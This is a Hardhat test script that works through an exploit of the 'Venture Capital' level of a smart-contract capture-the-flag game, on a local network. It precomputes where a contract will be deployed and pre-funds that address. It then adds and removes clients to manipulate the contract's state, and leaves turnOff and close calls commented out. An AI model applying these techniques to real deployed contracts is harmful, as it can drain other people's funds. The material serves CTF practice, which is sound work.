const { util } = require("chai");
const { ethers } = require("hardhat");
const hre = require('hardhat');

// https://github.com/cypherpunks-core/cypherpunks-ctf/blob/dev/contracts/levels/VentureCapitalFactory.sol

// Approach 1: send ether to the pre-computed address that DeveloperAuthorizer is about to be deployed
// Approach 2: kill the contract and re-deploy using CREATE2: https://hackernoon.com/using-ethereums-create2-nw2137q7
describe.only("Venture Capital", function () {
  it("hardhat local network", async function () {
    const provider = ethers.provider;

    const [player, deployer, client, client2] = await hre.ethers.getSigners();

    // const delpoyerNonce = await deployer.getTransactionCount();
    // console.log('delpoyerNonce', delpoyerNonce.toString(16));
    const preComputedVCAddr = ethers.utils.getContractAddress({
        from: deployer.address,
        nonce: await deployer.getTransactionCount()
    });
    console.log('preComputedVCAddr:', preComputedVCAddr);

    const preComputedDAAddr = ethers.utils.getContractAddress({
        from: preComputedVCAddr,
        nonce: 1
    });
    console.log('preComputedDAAddr:', preComputedDAAddr);

    player.sendTransaction({
        from: player.address,
        to: preComputedDAAddr,
        value: ethers.utils.parseEther('0.424242')
    });

    const VCFactory = await ethers.getContractFactory("VentureCapital");
    const vc = await VCFactory.connect(deployer).deploy({ value: ethers.utils.parseEther('1.0') });
    await vc.deployed();

    console.log('vc address', vc.address);

    const da = await ethers.getContractAt(
        require('../artifacts/contracts/VentureCapital.sol/DeveloperAuthorizer.json').abi,
        await vc.developerAuthorizer(),
        player
    );

    console.log('player.address:', player.address);
    console.log('owner.address:', await vc.owner());
    console.log('manager:', await vc.manager());

    console.log('vc balance: ', await provider.getBalance(vc.address));
    console.log('da balance: ', await provider.getBalance(da.address));
    console.log('vc client balance:', await vc.clientBalance());

    console.log('da address:', da.address);
    console.log('vc.developerAuthorizer():', await vc.developerAuthorizer());
    console.log('da.developerMode:', await da.developerMode());

    // console.log('da.developerMode:', await da.developerMode());

    // const managementEnableTx = await vc.connect(player).managementEnable(player.address);
    // await managementEnableTx.wait();

    const newClientTx = await vc.connect(player).newClient(client.address, 18, { value: 1 });
    await newClientTx.wait();
    console.log('clients.length: ', await vc.getClientsLength());
    console.log('clients[0]:', await vc.clients(0));

    // const VCAFactory = await ethers.getContractFactory("VentureCapitalAttack");
    // const vca = await VCAFactory.connect(player).deploy(vc.address);
    // await vca.deployed();

    const newClientTx2 = await vc.connect(player).newClient(client2.address, 20, { value: 2 });
    await newClientTx2.wait();

    console.log('clients.length: ', await vc.getClientsLength());
    console.log('clients[0]:', await vc.clients(0));
    console.log('clients[1]:', await vc.clients(1));

    const newClientTx3 = await vc.connect(player).newClient(client.address, 17, { value: 3 });
    await newClientTx3.wait();
    console.log('clients.length: ', await vc.getClientsLength());
    console.log('clients[0]:', await vc.clients(0));
    console.log('clients[1]:', await vc.clients(1));

    // const clientWithdrawTx = await vc.connect(player).clientWithdraw(vca.address);
    // await clientWithdrawTx.wait();

    const byeClientTx = await vc.connect(player).byeClient();
    await byeClientTx.wait();
    console.log('clients.length: ', await vc.getClientsLength());

    const newClientTx4 = await vc.connect(player).newClient(client.address, 18, { value: 4 });
    await newClientTx4.wait();
    console.log('clients.length: ', await vc.getClientsLength());
    console.log('clients[0]:', await vc.clients(0));

    // console.log('clients.length: ',await vc.getClientsLength());
    // console.log('vca balance: ', await provider2.getBalance(vca.address));
    // console.log('vc balance: ', await provider2.getBalance(vc.address));
    // console.log('clientIndex[vca]:', await vc.clientIndex(vca.address));
    // console.log('clients[0]:', await vc.clients(0));
    // console.log('99 clients[-1]:', await vc.clients(-1));

    // const clientWithdrawTx = await vc.clientWithdraw(vca.address);
    // await clientWithdrawTx.wait();

    // console.log('clients[0]:', await vc.clients(0));
    // console.log('clients.length: ', await vc.getClientsLength());

    // const byeClientTx = await vc.connect(player).byeClient();
    // await byeClientTx.wait();

    /* turn off da
    const turnOffTx = await da.connect(player).turnOff({ value: ethers.utils.parseEther('0.575758') });
    await turnOffTx.wait();

    const closeTx = await vc.close();
    await closeTx.wait();
    */

    // const newClientTx2 = await vc.newClient(client2.address, 18, { value: 1 });
    // await newClientTx2.wait();

    // console.log('clients.length: ',await vc.getClientsLength());
    // console.log('clientIndex[client2]:', await vc.clientIndex(client2.address));
    // console.log('clientIndex[client]:', await vc.clientIndex(client.address));
    // console.log('clients[0]:', await vc.clients(0));
    });
});
